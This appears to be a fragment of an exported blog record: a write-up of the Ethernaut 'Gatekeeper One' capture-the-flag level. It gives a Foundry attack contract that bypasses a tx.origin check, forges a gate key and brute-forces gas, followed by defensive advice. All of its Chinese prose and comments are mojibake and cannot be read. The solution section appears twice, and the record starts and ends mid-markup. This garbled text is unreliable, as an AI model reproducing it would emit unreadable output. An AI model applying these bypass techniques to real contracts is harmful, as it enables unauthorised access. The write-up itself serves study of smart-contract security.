class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/13_GatekeeperOne.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GatekeeperOneTest is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperOne();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testattacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // ä½¿ç”¨è¯•é”™æ³•æ‰¾åˆ°åˆé€‚çš„gaså€¼ (ä¾‹å¦‚ 268)</span><br><span class=\"line\">        attacker.attack(268);</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address fb) &#123;</span><br><span class=\"line\">        instance = GatekeeperOne(fb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // æ„é€  gateKey å¹¶ä½¿ç”¨æŒ‡å®šçš„ gas è°ƒç”¨ enter å‡½æ•°</span><br><span class=\"line\">    function attack(uint256 gas) public &#123;</span><br><span class=\"line\">        // æ„é€ æ»¡è¶³ gateThree çš„ key</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\"></span><br><span class=\"line\">        // ä½¿ç”¨è®¡ç®—å¥½çš„ gas è°ƒç”¨ç›®æ ‡å‡½æ•°</span><br><span class=\"line\">        instance.enter&#123;gas: 8191 * 10 + gas&#125;(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ç”¨äºæš´åŠ›ç ´è§£ gas å€¼çš„å‡½æ•°</span><br><span class=\"line\">    function findGas() public &#123;</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class=\"line\">            try instance.enter&#123;gas: 8191 * 10 + i&#125;(gateKey) &#123;</span><br><span class=\"line\">                console.log(&quot;Found gas:&quot;, i); // å®éªŒå¾—å‡º i = 268</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125; catch &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        revert(&quot;No gas match found!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: ç»•è¿‡ <code>gateOne</code> (<code>msg.sender != tx.origin</code>)ã€‚</li>\n<li><strong>æ„é€  <code>_gateKey</code></strong>:<ul>\n<li>è·å– <code>tx.origin</code> çš„ä½16ä½ã€‚</li>\n<li>å°†å…¶æ„é€ æˆä¸€ä¸ª <code>bytes8</code> å€¼ï¼Œæ»¡è¶³ <code>gateThree</code> çš„æ‰€æœ‰ <code>require</code> æ¡ä»¶ã€‚</li>\n</ul>\n</li>\n<li><strong>æš´åŠ›ç ´è§£ <code>gas</code></strong>:<ul>\n<li>ç¼–å†™ä¸€ä¸ªå¾ªç¯ï¼Œå°è¯•ä¸åŒçš„ <code>gas</code> å€¼æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</li>\n<li>åœ¨ <code>Foundry</code> æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>try/catch</code> æ•è·å¤±è´¥çš„è°ƒç”¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæˆåŠŸçš„ <code>gas</code> å€¼ï¼ˆä¾‹å¦‚ï¼Œ<code>gas</code> åç§»é‡ä¸º <code>268</code>ï¼‰ã€‚</li>\n</ul>\n</li>\n<li><strong>å‘èµ·æ”»å‡»</strong>: ä½¿ç”¨æ‰¾åˆ°çš„ <code>gas</code> å€¼å’Œæ„é€ çš„ <code>_gateKey</code> ä»æ”»å‡»åˆçº¦ä¸­è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…å¤æ‚çš„ <code>gas</code> æ£€æŸ¥</strong>: <code>gasleft()</code> çš„å€¼æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¼šéšç€EVMçš„æ›´æ–°è€Œæ”¹å˜ã€‚ä¸åº”å°†å…¶ç”¨äºå…³é”®çš„è®¿é—®æ§åˆ¶é€»è¾‘ã€‚</li>\n<li><strong>ç®€åŒ–ç±»å‹è½¬æ¢é€»è¾‘</strong>: è¿‡äºå¤æ‚çš„ç±»å‹è½¬æ¢å’Œä½æ“ä½œä¼šä½¿ä»£ç éš¾ä»¥ç†è§£ï¼Œå¹¶å¯èƒ½å¼•å…¥æ„æƒ³ä¸åˆ°çš„æ¼æ´ã€‚åº”ä¿æŒé€»è¾‘æ¸…æ™°ã€ç›´æ¥ã€‚</li>\n<li><strong>ä½¿ç”¨æ›´å®‰å…¨çš„è®¤è¯æ¨¡å¼</strong>: ä¸è¦ä¾èµ– <code>tx.origin</code> æˆ– <code>gas</code> æŠ€å·§ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨æ•°å­—ç­¾åã€Merkleæ ‘æˆ–é¢„è¨€æœºç­‰æ›´å¼ºå¤§çš„éªŒè¯æœºåˆ¶ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>Foundry <code>try/catch</code></strong>: ç”¨äºåœ¨æµ‹è¯•ä¸­æ•è·å’Œå¤„ç†é¢„æœŸçš„ <code>revert</code>ï¼Œéå¸¸é€‚åˆæš´åŠ›ç ´è§£ <code>gas</code> ç­‰åœºæ™¯ã€‚</li>\n<li><strong>ä½æ“ä½œ (<code>|</code>, <code>&amp;</code>)</strong>: åœ¨æ„é€  <code>_gateKey</code> æ—¶ç”¨äºç²¾ç¡®æ§åˆ¶å­—èŠ‚å†…å®¹ã€‚</li>\n<li><strong>ç±»å‹è½¬æ¢</strong>: æ·±å…¥ç†è§£Solidityä¸­ä¸åŒæ•´æ•°ç±»å‹ï¼ˆ<code>uint16</code>, <code>uint32</code>, <code>uint64</code>ï¼‰å’Œå­—èŠ‚ç±»å‹ï¼ˆ<code>bytes8</code>ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™è‡³å…³é‡è¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>tx.origin</code> vs <code>msg.sender</code> çš„åŒºåˆ«æ˜¯è®¸å¤šåˆçº¦æ”»å‡»çš„åŸºç¡€ã€‚</li>\n<li><code>gasleft()</code> çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œä¾èµ–å®ƒè¿›è¡ŒéªŒè¯æ˜¯è„†å¼±çš„ã€‚</li>\n<li>Solidityä¸­çš„ç±»å‹è½¬æ¢éµå¾ªä¸¥æ ¼çš„è§„åˆ™ï¼Œä¸æ­£ç¡®çš„è½¬æ¢æˆ–æˆªæ–­æ˜¯å¸¸è§çš„æ¼æ´æ¥æºã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸­é—´åˆçº¦ç»•è¿‡ <code>tx.origin</code> æ£€æŸ¥ã€‚</li>\n<li>é€šè¿‡æš´åŠ›ç ´è§£æ‰¾åˆ°æ»¡è¶³ <code>gasleft()</code> æ¨¡è¿ç®—çš„ <code>gas</code> å€¼ã€‚</li>\n<li>é€šè¿‡é€†å‘å·¥ç¨‹ç±»å‹è½¬æ¢å’Œä½æ“ä½œçš„ <code>require</code> æ¡ä»¶æ¥æ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸è¦å°† <code>gas</code> æ¶ˆè€—ä½œä¸ºå®‰å…¨æœºåˆ¶ã€‚</li>\n<li>ä¿æŒéªŒè¯é€»è¾‘çš„ç®€å•å’Œç›´æ¥ã€‚</li>\n<li>ä½¿ç”¨ç»è¿‡éªŒè¯çš„ã€æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯æ¨¡å¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/types.html#conversions\">Solidity ç±»å‹è½¬æ¢</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">tx.origin vs msg.sender</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-13-Gatekeeper-One-Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\"><a href=\"#ğŸ¯-Ethernaut-Level-13-Gatekeeper-One-Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\"></a>ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/13\">Ethernaut Level 13 - Gatekeeper One</a><br><strong>æ”»å‡»ç±»å‹</strong>: Gasè®¡ç®— &#x2F; ç±»å‹è½¬æ¢<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>é€šè¿‡ä¸‰ä¸ª <code>modifier</code> çš„æ£€æµ‹ï¼ŒæˆåŠŸè°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œæˆä¸º <code>entrant</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg\" alt=\"Gatekeeper One Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ <code>enter(bytes8 _gateKey)</code> å‡½æ•°ï¼Œä½†å¿…é¡»ç»•è¿‡å®ƒçš„ä¸‰ä¸ª <code>modifier</code>ã€‚è®©æˆ‘ä»¬é€ä¸€åˆ†æã€‚</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> è¦æ±‚ <code>msg.sender</code> ä¸ç­‰äº <code>tx.origin</code>ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„æ£€æŸ¥ï¼Œç”¨äºé˜²æ­¢ç›´æ¥ä»å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ã€‚ä¸ºäº†ç»•è¿‡å®ƒï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚è¿™æ ·ï¼Œ<code>tx.origin</code> å°†æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ï¼Œè€Œ <code>msg.sender</code> å°†æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ã€‚</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  require(gasleft() % 8191 == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> è¦æ±‚åœ¨æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå‰©ä½™çš„ <code>gas</code> å¿…é¡»æ˜¯ <code>8191</code> çš„å€æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„çº¦æŸï¼Œå› ä¸º <code>gas</code> çš„æ¶ˆè€—ä¼šå› æ“ä½œç ã€Solidityç‰ˆæœ¬å’Œä¼˜åŒ–å™¨è®¾ç½®è€Œå¼‚ã€‚</p>\n<p>æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼šé€šè¿‡ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è°ƒç”¨ <code>enter</code> å‡½æ•°æ—¶å°è¯•ä¸åŒçš„ <code>gas</code> å€¼ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ <code>gasleft() % 8191 == 0</code> çš„å€¼ã€‚</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> å¯¹æˆ‘ä»¬ä¼ å…¥çš„ <code>_gateKey</code> (ä¸€ä¸ª <code>bytes8</code> ç±»å‹çš„å€¼) è¿›è¡Œäº†ä¸‰é¡¹æ£€æŸ¥ï¼š</p>\n<ol>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code></p>\n<ul>\n<li><code>uint64(_gateKey)</code> å°† <code>bytes8</code> è½¬æ¢ä¸º <code>uint64</code>ã€‚</li>\n<li><code>uint32(...)</code> ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½32ä½ã€‚</li>\n<li><code>uint16(...)</code> ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½16ä½ã€‚</li>\n<li>ä¸ºäº†è®©ä¸¤è€…ç›¸ç­‰ï¼Œ<code>_gateKey</code> çš„ç¬¬17ä½åˆ°ç¬¬32ä½å¿…é¡»å…¨ä¸º0ã€‚ä¾‹å¦‚ï¼Œ<code>0x????????0000????</code>ã€‚</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>\n<ul>\n<li>è¿™è¦æ±‚ <code>_gateKey</code> çš„é«˜32ä½ä¸å…¨ä¸º0ã€‚</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</code></p>\n<ul>\n<li><code>uint16(uint160(tx.origin))</code> è·å– <code>tx.origin</code> åœ°å€çš„æœ€ä½16ä½ã€‚</li>\n<li>è¿™è¦æ±‚ <code>_gateKey</code> çš„ä½32ä½ï¼ˆç»è¿‡ç¬¬ä¸€æ¬¡æ£€æŸ¥åï¼Œå…¶å®å°±æ˜¯ä½16ä½ï¼‰å¿…é¡»ç­‰äº <code>tx.origin</code> çš„ä½16ä½ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>ç»¼åˆè¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡º <code>_gateKey</code>ï¼š</p>\n<ul>\n<li>å°† <code>tx.origin</code> (å³æˆ‘ä»¬çš„EOAåœ°å€) çš„ä½16ä½ä½œä¸º <code>_gateKey</code> çš„ä½16ä½ã€‚</li>\n<li>ç¡®ä¿ <code>_gateKey</code> çš„17-32ä½ä¸º0ã€‚</li>\n<li>åœ¨ <code>_gateKey</code> çš„é«˜32ä½ä¸­è®¾ç½®è‡³å°‘ä¸€ä¸ªéé›¶ä½ã€‚</li>\n</ul>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>è¿™æ˜¯æˆ‘ä»¬çš„Foundryæµ‹è¯•åˆçº¦ï¼Œå®ƒå°†éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/13_GatekeeperOne.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GatekeeperOneTest is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperOne();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testattacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // ä½¿ç”¨è¯•é”™æ³•æ‰¾åˆ°åˆé€‚çš„gaså€¼ (ä¾‹å¦‚ 268)</span><br><span class=\"line\">        attacker.attack(268);</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address fb) &#123;</span><br><span class=\"line\">        instance = GatekeeperOne(fb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // æ„é€  gateKey å¹¶ä½¿ç”¨æŒ‡å®šçš„ gas è°ƒç”¨ enter å‡½æ•°</span><br><span class=\"line\">    function attack(uint256 gas) public &#123;</span><br><span class=\"line\">        // æ„é€ æ»¡è¶³ gateThree çš„ key</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\"></span><br><span class=\"line\">        // ä½¿ç”¨è®¡ç®—å¥½çš„ gas è°ƒç”¨ç›®æ ‡å‡½æ•°</span><br><span class=\"line\">        instance.enter&#123;gas: 8191 * 10 + gas&#125;(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ç”¨äºæš´åŠ›ç ´è§£ gas å€¼çš„å‡½æ•°</span><br><span class=\"line\">    function findGas() public &#123;</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class=\"line\">            try instance.enter&#123;gas: 8191 * 10 + i&#125;(gateKey) &#123;</span><br><span class=\"line\">                console.log(&quot;Found gas:&quot;, i); // å®éªŒå¾—å‡º i = 268</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125; catch &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        revert(&quot;No gas match found!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: ç»•è¿‡ <code>gateOne</code> (<code>msg.sender != tx.origin</code>)ã€‚</li>\n<li><strong>æ„é€  <code>_gateKey</code></strong>:<ul>\n<li>è·å– <code>tx.origin</code> çš„ä½16ä½ã€‚</li>\n<li>å°†å…¶æ„é€ æˆä¸€ä¸ª <code>bytes8</code> å€¼ï¼Œæ»¡è¶³ <code>gateThree</code> çš„æ‰€æœ‰ <code>require</code> æ¡ä»¶ã€‚</li>\n</ul>\n</li>\n<li><strong>æš´åŠ›ç ´è§£ <code>gas</code></strong>:<ul>\n<li>ç¼–å†™ä¸€ä¸ªå¾ªç¯ï¼Œå°è¯•ä¸åŒçš„ <code>gas</code> å€¼æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</li>\n<li>åœ¨ <code>Foundry</code> æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>try/catch</code> æ•è·å¤±è´¥çš„è°ƒç”¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæˆåŠŸçš„ <code>gas</code> å€¼ï¼ˆä¾‹å¦‚ï¼Œ<code>gas</code> åç§»é‡ä¸º <code>268</code>ï¼‰ã€‚</li>\n</ul>\n</li>\n<li><strong>å‘èµ·æ”»å‡»</strong>: ä½¿ç”¨æ‰¾åˆ°çš„ <code>gas</code> å€¼å’Œæ„é€ çš„ <code>_gateKey</code> ä»æ”»å‡»åˆçº¦ä¸­è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…å¤æ‚çš„ <code>gas</code> æ£€æŸ¥</strong>: <code>gasleft()</code> çš„å€¼æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¼šéšç€EVMçš„æ›´æ–°è€Œæ”¹å˜ã€‚ä¸åº”å°†å…¶ç”¨äºå…³é”®çš„è®¿é—®æ§åˆ¶é€»è¾‘ã€‚</li>\n<li><strong>ç®€åŒ–ç±»å‹è½¬æ¢é€»è¾‘</strong>: è¿‡äºå¤æ‚çš„ç±»å‹è½¬æ¢å’Œä½æ“ä½œä¼šä½¿ä»£ç éš¾ä»¥ç†è§£ï¼Œå¹¶å¯èƒ½å¼•å…¥æ„æƒ³ä¸åˆ°çš„æ¼æ´ã€‚åº”ä¿æŒé€»è¾‘æ¸…æ™°ã€ç›´æ¥ã€‚</li>\n<li><strong>ä½¿ç”¨æ›´å®‰å…¨çš„è®¤è¯æ¨¡å¼</strong>: ä¸è¦ä¾èµ– <code>tx.origin</code> æˆ– 